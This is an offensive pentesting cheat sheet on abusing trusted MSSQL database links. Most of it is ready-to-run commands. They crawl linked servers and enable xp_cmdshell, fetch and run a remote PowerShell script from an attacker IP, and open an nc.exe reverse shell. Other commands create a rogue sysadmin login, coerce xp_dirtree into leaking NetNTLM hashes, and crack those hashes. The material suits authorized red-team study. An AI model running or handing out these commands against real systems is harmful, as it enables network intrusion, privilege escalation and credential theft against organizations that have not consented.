# MSSQL Trusted Links

## MSSQL Trusted Links

If a user has privileges to **access MSSQL instances**, he could be able to use it to **execute commands** in the MSSQL host (if running as SA).\
Also, if a MSSQL instance is trusted (database link) by a different MSSQL instance. If the user has privileges over the trusted database, he is going to be able to **use the trust relationship to execute queries also in the other instance**. This trusts can be chained and at some point the user might be able to find some misconfigured database where he can execute commands.

**The links between databases work even across forest trusts.**

### **Powershell**

```bash
Import-Module .\PowerupSQL.psd1

#Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#If you don't have a AD account, you can try to find MSSQL scanning via UDP
#First, you will need a list of hosts to scan
Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads 10

#If you have some valid credentials and you have discovered valid MSSQL hosts you can try to login into them
#The discovered MSSQL servers must be on the file: C:\temp\instances.txt
Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test

## FROM INSIDE OF THE DOMAIN
#Get info about valid MSQL instances running in domain
#This looks for SPNs that starts with MSSQL (not always is a MSSQL running instance)
Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose 

#Test connections with each one
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose

#Try to connect and obtain info from each MSSQL server (also useful to check conectivity)
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose

#Dump an instance (a lotof CVSs generated in current dir)
Invoke-SQLDumpInfo -Verbose -Instance "dcorp-mssql"

#Look for MSSQL links of an accessible instance
Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0

#Crawl trusted links, starting form the given one (the user being used by the MSSQL instance is also specified)
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose

#If you are sysadmin in some trusted link you can enable xp_cmdshell with:
Get-SQLServerLinkCrawl -instance "<INSTANCE1>" -verbose -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "<INSTANCE2>"'

#Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query "exec master..xp_cmdshell 'whoami'"

#Obtain a shell
Get-SQLServerLinkCrawl -Instance dcorp-mssql  -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1'')"'

#Check for possible vulnerabilities on an instance where you have access
Invoke-SQLAudit -Verbose -Instance "dcorp-mssql.dollarcorp.moneycorp.local"

#Try to escalate privileges on an instance
Invoke-SQLEscalatePriv –Verbose –Instance "SQLServer1\Instance1"
```

### OSQL

```powershell
osql -E -S "CYWEBDW" -Q "EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT [m3sqlw.m3c.local]"
osql -E -S "CYWEBDW" -Q "EXECUTE('xp_cmdshell ''c:\users\public\nc.exe -e cmd.exe $ip 443'' ') AT [m3sqlw.m3c.local];"
osql -E -S "CYWEBDW" -Q "EXECUTE('xp_cmdshell ''c:\users\public\nc.exe -e cmd.exe $ip 443'' ') AT [m3sqlw.m3c.local];"
```

### Metasploit

You can easily check for trusted links using metasploit.

```bash
#Set username, password, windows auth (if using AD), IP...
msf> use exploit/windows/mssql/mssql_linkcrawler
[msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
```

Notice that metasploit will try to abuse only the `openquery()` function in MSSQL (so, if you can't execute command with `openquery()` you will need to try the `EXECUTE` method **manually** to execute commands, see more below.)

### Manual - Openquery()

From Linux you could obtain a MSSQL console shell with **sqsh** and **mssqlclient.py** and run queries like:

```bash
select * from openquery("DOMINIO\SERVER1",'select * from openquery("DOMINIO\SERVER2",''select * from master..sysservers'')')
```

From Windows you could also find the links and execute commands manually using a MSSQL client like [HeidiSQL](https://www.heidisql.com)

_Login using Windows authentication:_

![](<../../.gitbook/assets/image (167).png>)

_Find links inside the accessible MSSQL server (in this case the link is to dcorp-sql1):_\
\_\_`select * from master..sysservers`

![](<../../.gitbook/assets/image (168).png>)

Execute queries through the link (example: find more links in the new accessible instance):\
`select * from openquery("dcorp-sql1", 'select * from master..sysservers')`

![](<../../.gitbook/assets/image (169).png>)

You can continue these trusted links chain forever manually.

Some times you won't be able to perform actions like `exec xp_cmdshell` from `openquery()` in those cases it might be worth it to test the following method:

### Manual - EXECUTE

You can also abuse trusted links using EXECUTE:

```bash
#Create user and give admin privileges
EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
```

#### MS SQL NetNTLM Capture

The **xp\_dirtree** procedure can be used to capture the NetNTLM hash of the principal being used to run the MS SQL Service. We can use [InveighZero](https://github.com/Kevin-Robertson/InveighZero) to listen to the incoming requests (this should be run as a local admin).

```
beacon> execute-assembly C:\Tools\InveighZero\Inveigh\bin\Debug\Inveigh.exe -DNS N -LLMNR N -LLMNRv6 N -HTTP N -FileOutput N

[*] Inveigh 0.913 started at 2021-03-10T18:02:36
[+] Elevated Privilege Mode = Enabled
[+] Primary IP Address = 10.10.17.231
[+] Spoofer IP Address = 10.10.17.231
[+] Packet Sniffer = Enabled
[+] DHCPv6 Spoofer = Disabled
[+] DNS Spoofer = Disabled
[+] LLMNR Spoofer = Disabled
[+] LLMNRv6 Spoofer = Disabled
[+] mDNS Spoofer = Disabled
[+] NBNS Spoofer = Disabled
[+] HTTP Capture = Disabled
[+] Proxy Capture = Disabled
[+] WPAD Authentication = NTLM
[+] WPAD NTLM Authentication Ignore List = Firefox
[+] SMB Capture = Enabled
[+] Machine Account Capture = Disabled
[+] File Output = Disabled
[+] Log Output = Enabled
[+] Pcap Output = Disabled
[+] Previous Session Files = Not Found
[*] Press ESC to access console
```

Now execute `EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1` on the MS SQL server, where `10.10.17.231` is the IP address of the machine running InveighZero.

```
[+] [2021-05-14T15:33:49] TCP(445) SYN packet from 10.10.17.25:50323
[+] [2021-05-14T15:33:49] SMB(445) negotiation request detected from 10.10.17.25:50323
[+] [2021-05-14T15:33:49] SMB(445) NTLM challenge 3006547FFC8E90D8 sent to 10.10.17.25:50323
[+] [2021-05-14T15:33:49] SMB(445) NTLMv2 captured for DEV\svc_mssql from 10.10.17.25(SRV-1):50323:
svc_mssql::DEV:[...snip...]
```

Use `--format=netntlmv2 --wordlist=wordlist svc_mssql-netntlmv2` with **john** or `-a 0 -m 5600 svc_mssql-netntlmv2 wordlist` with **hashcat** to crack.

This is useful because the SQL Instance may be being run by a privileged account, sometimes even a Domain Admin. InveighZero will ignore traffic coming from accounts that are generally deemed to be "uncrackable" such as computer accounts.

You may also use the WinDivert + rportfwd combo (shown on the **NTLM Relaying page**) with Impacket's [smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) to capture the NetNTLM hashes.

```
root@kali:~# python3 /usr/local/bin/smbserver.py -smb2support pwn .
Impacket v0.9.24.dev1+20210720.100427.cd4fe47c - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (127.0.0.1,46894)
[-] Unsupported MechType 'MS KRB5 - Microsoft Kerberos 5'
[*] AUTHENTICATE_MESSAGE (DEV\svc_mssql,SRV-1)
[*] User SRV-1\svc_mssql authenticated successfully
[*] svc_mssql::DEV:[...snip...]
[*] Connecting Share(1:pwn)
```
